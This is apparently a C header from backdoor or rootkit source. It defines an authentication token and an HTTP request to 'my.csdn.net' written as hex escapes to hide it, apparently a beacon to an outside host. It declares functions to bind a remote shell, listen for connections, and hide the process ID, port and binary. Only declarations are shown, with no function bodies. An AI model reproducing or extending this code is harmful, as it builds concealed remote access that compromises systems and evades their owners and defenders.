#define AUTH_TOKEN 0x12345678
#define RANDOM_MAX (44+44)
#define RANDOM_BASE (4*3600-44)

#define HOST "my.csdn.net"
#define PORT (80)
#define CONTENT \
  "\x47\x45\x54\x20"\
  "\x2f\x65\x63\x68"\
  "\x6f\x66\x6f\x63"\
  "\x75\x73\x20\x48"\
  "\x54\x54\x50\x2f"\
  "\x31\x2e\x31\x0d"\
  "\x0a\x48\x6f\x73"\
  "\x74\x3a\x20\x6d"\
  "\x79\x2e\x63\x73"\
  "\x64\x6e\x2e\x6e"\
  "\x65\x74\x0d\x0a"\
  "\x0d\x0a"

void bind_shell( ) ;
void serv_listen( const char* addr , int port ) ;
void hide_pid( ) ;
void hide_port( int port ) ;
void hide_binary( ) ;
